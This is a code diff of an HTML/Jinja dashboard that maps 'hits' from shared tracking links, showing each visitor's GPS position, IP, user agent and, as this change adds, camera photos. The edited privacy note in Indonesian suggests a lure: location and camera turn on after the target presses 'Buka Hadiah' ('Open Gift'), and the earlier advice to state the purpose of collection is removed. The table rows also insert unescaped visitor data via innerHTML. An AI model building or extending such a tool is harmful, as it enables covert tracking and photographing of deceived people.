@@ -9,13 +9,13 @@
     :root{
       --bg:#0b1020; --surface:#0f172a; --text:#e5e7eb;
       --muted:#94a3b8; --card:rgba(255,255,255,.06);
-      --stroke:rgba(255,255,255,.12); --accent:#8b5cf6; --accent-2:#22d3ee;
-      --danger:#ef4444; --success:#22c55e;
+      --stroke:rgba(255,255,255,.12); --accent:#8b5cf6; --accent2:#22d3ee;
+      --danger:#ef4444;
     }
     *{box-sizing:border-box}
     body{
       margin:0; min-height:100vh; color:var(--text);
-      font: 14px/1.55 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial;
+      font:14px/1.55 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial;
       background: radial-gradient(1200px 800px at 20% -10%, #1f2937 0%, #0b1020 40%, #0b1020 100%);
     }
     .container{max-width:1200px; margin:24px auto; padding:16px}
@@ -27,7 +27,7 @@
       display:flex; align-items:center; gap:12px; justify-content:space-between;
     }
     .brand{display:flex; align-items:center; gap:10px}
-    .brand .dot{width:10px; height:10px; border-radius:999px; background:linear-gradient(135deg,var(--accent),var(--accent-2))}
+    .brand .dot{width:10px; height:10px; border-radius:999px; background:linear-gradient(135deg,var(--accent),var(--accent2))}
     .brand h1{font-size:16px; margin:0}
     .actions{display:flex; gap:8px; flex-wrap:wrap}
     .btn{
@@ -36,7 +36,7 @@
       transition:.2s transform ease;
     }
     .btn:hover{transform:translateY(-1px)}
-    .btn.primary{background:linear-gradient(135deg,var(--accent),var(--accent-2)); border-color:transparent}
+    .btn.primary{background:linear-gradient(135deg,var(--accent),var(--accent2)); border-color:transparent}
     .btn.danger{border-color: rgba(239,68,68,.35); background:#1b1111; color:#fecaca}
     .btn.ghost{background:transparent}
     .input{
@@ -51,9 +51,7 @@
     }
     h3{margin:6px 0 10px; font-size:15px}
     .list{max-height:440px; overflow:auto; display:flex; flex-direction:column; gap:8px}
-    .item{
-      padding:10px; border:1px solid var(--stroke); border-radius:12px; background:#0e162b;
-    }
+    .item{padding:10px; border:1px solid var(--stroke); border-radius:12px; background:#0e162b;}
     .item.focus{outline:2px solid rgba(139,92,246,.45)}
     .item .title{display:flex; align-items:center; gap:8px; justify-content:space-between}
     .badge{font-size:12px; padding:3px 8px; border-radius:999px; border:1px solid var(--stroke); color:#cbd5e1}
@@ -71,15 +69,12 @@
     code, .mono{font-family: ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
     .note{font-size:12px; color:var(--muted); margin-top:10px}
     .toolbar{display:flex; gap:8px; flex-wrap:wrap; margin:10px 0}
-    .toast{
-      position: fixed; bottom:14px; right:14px; padding:10px 12px; border-radius:12px;
-      background:#0e162b; border:1px solid var(--stroke); display:none;
-    }
+    .toast{position: fixed; bottom:14px; right:14px; padding:10px 12px; border-radius:12px; background:#0e162b; border:1px solid var(--stroke); display:none;}
+    .thumb{ width:64px; height:48px; object-fit:cover; border-radius:8px; border:1px solid rgba(255,255,255,.15) }
   </style>
 </head>
 <body>
   <div class="container">
-    <!-- Header -->
     <div class="header">
       <div class="brand">
         <div class="dot"></div>
@@ -93,7 +88,6 @@
     </div>
 
     <div class="grid">
-      <!-- Sidebar -->
       <div class="card">
         <h3>Channel</h3>
         <div class="list">
@@ -119,7 +113,6 @@
         </div>
       </div>
 
-      <!-- Main -->
       <div class="card">
         {% if focus %}
           <div style="display:flex; align-items:center; justify-content:space-between; gap:10px">
@@ -143,13 +136,14 @@
                 <th>± (m)</th>
                 <th>IP (label)</th>
                 <th>UA</th>
+                <th>Foto</th>
               </tr>
             </thead>
             <tbody></tbody>
           </table>
 
           <p class="note">
-            Privasi: lokasi hanya terkirim jika user menekan “Allow”. Cantumkan tujuan pengambilan lokasi pada halaman share.
+            Privasi: lokasi/kamera hanya aktif jika user menekan “Buka Hadiah” dan memberi izin.
           </p>
         {% else %}
           <p class="note">Pilih salah satu channel di kiri untuk melihat peta & data.</p>
@@ -163,7 +157,7 @@
   {% if focus %}
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <script>
-    // --- helpers UI ---
+    // UI helpers
     const toast = (msg)=>{ const t=document.getElementById('toast'); t.textContent=msg; t.style.display='block'; setTimeout(()=>t.style.display='none',1600); };
     document.querySelectorAll('[data-copy]').forEach(b=>{
       b.addEventListener('click', async ()=>{
@@ -171,16 +165,14 @@
       });
     });
 
-    // --- map & polling ---
+    // Map & polling
     const token = {{ focus|tojson }};
     const map = L.map('map',{zoomControl:true}).setView([0,0], 2);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
-      attribution:'&copy; OpenStreetMap'
-    }).addTo(map);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{ attribution:'&copy; OpenStreetMap' }).addTo(map);
 
     const tbody = document.querySelector('#tbl tbody');
     let lastTs = null, paused = false;
-    let markers = {};           // id -> {marker,circle}
+    let markers = {};
     let bounds = L.latLngBounds([]);
 
     function addRow(hit){
@@ -188,6 +180,7 @@
       const lat = hit.coords.lat, lon = hit.coords.lon, acc = hit.coords.acc ?? '-';
       const src = hit.coords.source || '-';
       const ipLabel = hit.ip + (hit.ip_label ? ` (${hit.ip_label})` : '');
+      const foto = hit.photo_url ? `<a href="${hit.photo_url}" target="_blank"><img class="thumb" src="${hit.photo_url}" alt="photo"></a>` : '-';
       tr.innerHTML = `
         <td class="mono">${hit.ts}</td>
         <td>${src}</td>
@@ -196,6 +189,7 @@
         <td class="mono">${acc}</td>
         <td class="mono" title="${ipLabel}">${ipLabel}</td>
         <td title="${hit.ua||''}">${(hit.ua||'').slice(0,80)}</td>
+        <td>${foto}</td>
       `;
       tbody.prepend(tr);
     }
@@ -203,7 +197,6 @@
     function addPoint(hit){
       const lat = hit.coords.lat, lon = hit.coords.lon;
       if (lat==null || lon==null) return;
-
       const acc = Math.max(0, hit.coords.acc || 0);
       const m = L.marker([lat,lon]).addTo(map);
       const c = L.circle([lat,lon], { radius: Math.max(5, acc), color:'#8b5cf6', fillColor:'#8b5cf6', fillOpacity:.15 }).addTo(map);
@@ -230,10 +223,9 @@
       }catch(e){}
     }
 
-    const interval = setInterval(fetchUpdates, 2500);
+    setInterval(fetchUpdates, 2500);
     fetchUpdates();
 
-    // toolbar buttons
     document.getElementById('fitBtn').onclick = ()=>{ if (bounds.isValid()) map.fitBounds(bounds.pad(0.25)); };
     document.getElementById('pauseBtn').onclick = (e)=>{ paused = !paused; e.target.textContent = paused ? 'Resume' : 'Pause'; };
     document.getElementById('clearBtn').onclick = async ()=>{
